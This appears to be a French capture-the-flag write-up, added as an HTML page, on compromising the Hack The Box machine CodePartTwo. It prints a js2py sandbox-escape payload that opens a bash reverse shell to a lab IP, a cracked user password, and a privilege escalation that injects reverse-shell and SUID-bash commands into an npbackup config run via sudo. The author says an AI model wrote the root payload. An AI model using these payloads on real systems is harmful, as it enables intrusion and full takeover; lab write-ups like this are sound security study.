@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>CodePartTwo - Writeup HTB</title>
+    <meta name="description" content="Writeup Hack The Box - CodePartTwo">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="../writeups.css">
+    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
+</head>
+
+<body class="writeups-mode">
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="../../" class="nav-logo-link">
+                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
+                        alt="logo signature Raphaël">
+                </a>
+                <div class="nav-links">
+                    <a href="../../" class="nav-link">Accueil</a>
+                    <a href="../" class="nav-link active">Writeups</a>
+                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="min-h-screen">
+        <div class="writeups-container">
+            <a href="../" class="back-link">← Retour aux writeups</a>
+            <div class="writeup-content">
+<header><h1 class="page-title" dir="auto"><strong>CodePartTwo</strong></h1></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="29caa764-c45c-8061-90f4-d030884a350a" class="">USER</h1></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-804f-b83e-d0ea4b202434" class="">Scan nmap de :</p></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-8092-9cac-d8e4b17081ec" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Gunicorn 20.0.4</code></pre></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80ca-9b2f-e53b7e248366" class="">sur la page web</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80a2-b17e-c208e4281ceb" class="">Il y a le code source de l’app</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80bb-8dc4-e7cbe85cb739" class="">on vois que l’app utilise js2py donc je vois si on peut sortir de la sandbox</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80c7-84bd-e40b29965bc3" class="">je trouve le tool parfait <a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py">https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py</a></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8059-aa33-f99b9ece66b9" class="">je met le payload avec revshell dans la webapp et j’ecoute sur le bon port et voila j’ai un shell</p></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-802d-a4dc-e430a536f912" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">let cmd = &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.15.3/4444 0&gt;&amp;1&#x27;&quot;
+let hacked, bymarve, n11
+let getattr, obj
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve(&quot;__getattribute__&quot;)
+obj = n11(&quot;__class__&quot;).__base__
+getattr = obj.__getattribute__
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == &quot;subprocess&quot; &amp;&amp; item.__name__ == &quot;Popen&quot;) {
+            return item
+        }
+        if(item.__name__ != &quot;type&quot; &amp;&amp; (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(n11)
+n11</code></pre></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-8053-ac0f-cca8c68a4946" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">app@codeparttwo:~/app$</code></pre></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-801a-8856-ebe127bbee25" class="">je sais ou est la db vu que j’ai le code source </p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-803b-ad90-ff0e8372c15a" class="">Lancement de un server python pour recuperer la users.db</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80e5-9a70-e0d45a16ae57" class="">j’ai la db je l’ouvre</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8064-8363-f11ac2dce66f" class="">Il y a <code>marco:649c9d65a206a75f5abe509fe128bce5</code> , je dechiffre son mdp avec crackstation <code>sweetangelbabylove</code></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80b0-a9e4-ee569eb56525" class="">Connexion SSH avec ces creds puis je cat le flag et c’est bon</p></div><div style="display:contents" dir="auto"><h1 id="29caa764-c45c-80e6-a4fc-fb39b1f978f1" class="">ROOT</h1></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8045-9ff8-efbbedfd7f88" class="">Exécution de LinPEAS et je grep sudo dans le resultat et Test avec toutes les cve, la machine n’est eligible a aucun exploit donc je recontextualise</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8038-9c34-e4805225e4b6" class="">je vois des backups dans le ~ donc c’est peut etre un indice, je grep backup dans le rendu linpeas et je vois un truc interessant</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80ad-9e73-f915999f824b" class="">littéralement :</p></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-8086-a158-c3a5d72555b2" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">User marco may run the following commands on codeparttwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli</code></pre></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80b1-ab9c-d732201db35c" class="">malheureusement il n’est pas sur <a href="https://gtfobins.github.io/">GTFObins</a></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80f8-af80-f3ac7cf5de55" class="">d’apprès les recherches sur <a href="https://github.com/netinvent/npbackup">NPBackup</a> en me fixant sur de l’injection de commandes :</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8049-8322-fd23a35da460" class=""><code>pre_exec_commands</code> : Commandes exécutées AVANT la sauvegarde</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8007-aa59-e8d926fc7ec3" class="">je regarde le fichier de conf backup qu’on a</p></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-8058-b3dc-ff8ea0a4be42" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">marco@codeparttwo:~$ cat npbackup.conf
+</code></pre></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8023-a699-ebc2dac7632f" class="">Il y a la section magique <code>pre_exec_commands: []</code></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8070-afda-f015ab19fd51" class="">pour créer une conf malicieuse :</p></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-8053-963b-e1141fea6398" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">cp /home/marco/npbackup.conf /tmp/evil.conf
+nano /tmp/evil.conf</code></pre></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80e9-b9a9-e6e60d7f9e15" class="">je remplace <code>pre_exec_commands: []</code> par </p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-809a-9518-ef6cebbbe50f" class=""><br/><code>pre_exec_commands: [&quot;sh -i &gt;&amp; /dev/tcp/</code><code><strong>10.10.15.3</strong></code><code>/</code><code><strong>4444</strong></code><code> 0&gt;&amp;1&quot;]</code></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-809a-b9cb-d9d77f1d0ca5" class="">ça fonctionne pas je demande alors a claude de faire un payload me permettant d’avoir un terminal en root :</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-803b-8162-df50ec75a1b2" class=""><code>pre_exec_commands: [&quot;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&quot;]</code> ce qui va copier le binaire bash dans <code>/tmp</code> puis ajouer le bit SUID pour que le fichier s’execute avec les perms du propriétaire (root en l’occurence) au lieu des miennes</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80be-930f-e8093edc1612" class="">Lancement de npbackup avec ma conf malicieuse</p></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-80e3-a68d-e2479523855b" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo /usr/local/bin/npbackup-cli -c /tmp/evil.conf --backup</code></pre></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80cf-8693-df90d6dec51e" class="">maintenant Lancement de mon shell (en preservant la session)</p></div><div style="display:contents" dir="auto"><pre id="29caa764-c45c-805f-8808-d7ba011a9a38" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">marco@codeparttwo:~$ /tmp/rootbash -p
+rootbash-5.0# whoami
+root</code></pre></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80d7-999d-f39fe9a15b82" class="">je cat le root et c’est bon</p></div><div style="display:contents" dir="auto"></div></div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
